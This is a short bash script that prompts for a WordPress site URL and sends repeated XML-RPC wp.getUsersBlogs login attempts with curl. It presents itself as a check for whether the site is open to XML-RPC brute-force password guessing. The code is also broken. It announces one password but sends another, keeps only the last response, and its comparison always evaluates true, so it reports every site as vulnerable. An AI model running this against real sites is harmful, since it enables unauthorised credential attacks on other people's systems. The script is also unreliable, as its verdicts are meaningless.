#!/bin/bash
# to use, type sh xmlrpcbruteforce.sh and give a URL when prompted


break='================================================================'

echo $break
echo
echo
echo Give the target sites URL
read urlname
echo
echo Sending a request to the given URL 
echo
echo Using the username foo and password password
echo
counter=1
while [ $counter -le 5 ]
do
request=$(curl -d '<?xml version="1.0" encoding="iso-8859-1"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>foo</string></value></param><param><value><string>summer</string></value></param></params></methodCall>' $urlname/xmlrpc.php)
((counter++))
done
echo
echo
echo 'Printing Response...'
echo $request
echo
echo
echo
newvar=$( echo $request | cut -c203-233 | wc -w  )

checkvar=4



if [ $newvar=$checkvar ];
        then
                echo "Site is vulnerable to XML-RPC brute force"
        else
				echo "Site not vulnerable to brute force"
        fi
echo
echo
echo
